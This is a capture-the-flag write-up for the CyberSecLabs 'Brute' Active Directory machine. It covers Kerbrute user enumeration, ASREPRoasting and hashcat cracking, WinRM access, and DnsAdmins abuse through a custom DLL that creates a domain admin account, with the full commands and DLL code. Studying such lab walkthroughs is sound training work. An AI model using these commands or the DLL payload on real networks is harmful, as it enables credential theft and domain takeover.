---
layout: single
title: CyberSecLabs - Brute
date: 2021-05-19
classes: wide
header:
  teaser: /assets/images/CSL-Brute/teaser.PNG
tags:
  - Active Directory
  - Username enumeration
  - ASREPRoast
  - Kerberos
  - Privilege escalation
  - psexec
--- 

# Introduction 

I decided to complete the "Brute" Active Directory (AD) machine on [CyberSecLabs](https://www.cyberseclabs.co.uk) because I'm in need of some practice with AD. Brute will teach CTF players a little bit of:

- Username enumeration
- ASREPRoast
- Kerberos 5 AS-REP hash cracking
- Privilege escalation

# Nmap scan results 

Firstly, we'll run a Nmap port scan, just so we can see the potential attack vectors. 

```
sudo nmap 172.31.3.3 -p- -A -oN nmap-all -vvv -T5
```

Here's the full Nmap output:

```
# Nmap 7.91 scan initiated Wed May 19 12:44:14 2021 as: nmap -p- -A -oN nmap-all -vvv -T5 172.31.3.3
Warning: 172.31.3.3 giving up on port because retransmission cap hit (2).
Nmap scan report for 172.31.3.3
Host is up, received echo-reply ttl 127 (0.017s latency).
Scanned at 2021-05-19 12:44:15 EDT for 101s
Not shown: 65511 closed ports
Reason: 65511 resets
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-05-19 16:44:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRUTE
|   NetBIOS_Domain_Name: BRUTE
|   NetBIOS_Computer_Name: BRUTE-DC
|   DNS_Domain_Name: brute.csl
|   DNS_Computer_Name: Brute-DC.brute.csl
|   DNS_Tree_Name: brute.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-05-19T16:45:48+00:00
| ssl-cert: Subject: commonName=Brute-DC.brute.csl
| Issuer: commonName=Brute-DC.brute.csl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-18T16:44:02
| Not valid after:  2021-11-17T16:44:02
| MD5:   f75e 8d64 5a14 4778 c92e 8af4 8b2e 2726
| SHA-1: 4262 5a6b 95fd 0e76 0918 77a8 9513 b1bd 3b07 470b
|_ssl-date: 2021-05-19T16:45:56+00:00; +1s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
OS fingerprint not ideal because: Timing level 5 (Insane) used
Aggressive OS guesses: Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 10 1703 (89%), Microsoft Windows 8 (89%), Microsoft Windows Server 2012 R2 (88%), Microsoft Windows Server 2012 R2 Update 1 (88%), Microsoft Windows Server 2016 build 10586 - 14393 (88%)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: BRUTE-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| nbstat: NetBIOS name: BRUTE-DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:a9:bd:05:93:28 (unknown)
| Names:
|   BRUTE-DC<20>         Flags: <unique><active>
|   BRUTE-DC<00>         Flags: <unique><active>
|   BRUTE<00>            Flags: <group><active>
|   BRUTE<1c>            Flags: <group><active>
| Statistics:
|   02 a9 bd 05 93 28 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17362/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64682/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35382/udp): CLEAN (Failed to receive data)
|   Check 4 (port 29582/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-19T16:45:48
|_  start_date: N/A

# Nmap done at Wed May 19 12:45:56 2021 -- 1 IP address (1 host up) scanned in 101.87 seconds
```

# Enumerating Users

Thanks to our port scan, I see that [Kerberos](https://en.wikipedia.org/wiki/Kerberos_(protocol)) is running on port 88.

According to Wikipedia:
> Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.

I'm going to use the [Kerbrute](https://github.com/ropnop/kerbrute) binary with the  [SecLists](https://github.com/danielmiessler/SecLists) `/Usernames/Names/names.txt` wordlist. This should allow us to enumerate some valid AD users. 

```
/opt/kerbrute/dist/kerbrute_linux_386 userenum --dc brute.csl -d brute.csl /opt/SecLists/Usernames/Names/names.txt
```

Output from kerbrute can be found below, the following users were identified:
- darleen
- malcolm
- patrick
- tess

![](/assets/images/CSL-Brute/users.PNG)

# ASREPRoast

Kerbrute was kind enough to let me know that the "tess" user has no Kerberos pre-authentication required. This means that it is vulnerable to ASREPRoast.

> That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

To grab the "tess" user hash, I'm going to use `GetNPUsers.py` from [Impacket](https://github.com/SecureAuthCorp/impacket)

```
GetNPUsers.py brute.csl/tess -format hashcat
```

Using the hash gained through ASREPRoast, we can attempt offline password attacks.

![](/assets/images/CSL-Brute/roast.PNG)

```
hashcat -m 18200 --force -a 0 asreproast.hash /opt/rockyou.txt
```

Hashcat was able to crack the hash fairly quicky and revealed the credentials.

![](/assets/images/CSL-Brute/hashcat.PNG)

# User

Using the credentials gained through the cracking process, we are able to gain a [WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) shell. Basically, WinRM allows us to remotely administer the machine from PowerShell.

```
cme winrm 172.31.3.3 -u tess -p '<password>'
```

`(Pwn3d!)` indicates that we can gain a shell.

![](/assets/images/CSL-Brute/cme-user.PNG)

We will now use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to gain a remote PowerShell prompt.

```
evil-winrm -u tess -i 172.31.3.3
```

![](/assets/images/CSL-Brute/evil-user.PNG)

# Domain Admin

First, we enumerate the "tess" user account to see what groups it is in. 

```
net user tess
```

We can see that the user is part of a group called `DnsAdmins`.

![](/assets/images/CSL-Brute/net-user.PNG)

> A user who is member of the DNSAdmins group or has write privileges to a DNS server object can load an arbitrary DLL with SYSTEM privileges on the DNS server.

To exploit this group, first download [DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) 

And then open the `DNSAdmin-DLL.sln` solution file in Visual Studio.

Replace the entire `DnsPluginInitialize` function found in the `DNSAdmin-DLL.cpp` file with the following.

```
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
	system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm /add /domain");
	system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
	return ERROR_SUCCESS;
}
```

![](/assets/images/CSL-Brute/better-function.PNG)

Hit CTRL+B to build the DLL. You'll now have a DLL called `DNSAdmin-DLL.dll`, in the `DNSAdmin-DLL-master\DNSAdmin-DLL\x64\Debug` folder. Move this file onto the victim machine. 

We can use the evil-winrm "upload" functionality, to easily get this file on our victim machine.

```
upload DNSAdmin-DLL.dll
```

![](/assets/images/CSL-Brute/winrm-upload.PNG)

Next, you can make the DNS server load an arbitrary DLL with SYSTEM privileges with the following command. Replace the location of the .dll file with wherever you uploaded it.

```
dnscmd BRUTE-DC /config /serverlevelplugindll C:\Users\Tess\DNSAdmin-DLL.dll
```

![](/assets/images/CSL-Brute/dns-config.PNG)

Now stop and start the DNS server for code execution. 

```
cmd.exe /c sc.exe stop dns
cmd.exe /c sc.exe start dns
```

![](/assets/images/CSL-Brute/net-stop-start.PNG)

From Kali, psexec into the machine as the newly created DA account. When prompted by psexec, enter the password `T0T4llyrAndOm`

```
psexec.py BRUTE.csl/Hacker@172.31.3.3
```

![](/assets/images/CSL-Brute/root.PNG)

# Proof flags 

![](/assets/images/CSL-Brute/flags.PNG)